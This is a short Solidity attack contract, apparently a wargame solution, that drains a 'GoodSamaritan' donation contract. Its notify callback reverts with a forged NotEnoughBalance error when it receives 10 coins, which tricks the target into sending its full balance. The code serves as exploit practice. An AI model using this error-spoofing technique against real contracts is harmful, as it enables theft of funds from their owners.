pragma solidity ^0.8.4;

// interface to call target function
interface IGoodSamaritan {
    function requestDonation() external returns (bool enoughBalance);
}

contract SamaritanAttack {
    // error signature will be taken from here
    error NotEnoughBalance();

    // entry point for our attack, simply requests a donation
    function pwn(address _addr) external {
        IGoodSamaritan(_addr).requestDonation();
    }

    // notify is called when this contract receives coins
    function notify(uint256 amount) external pure {
        // only revert on 10 coins
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
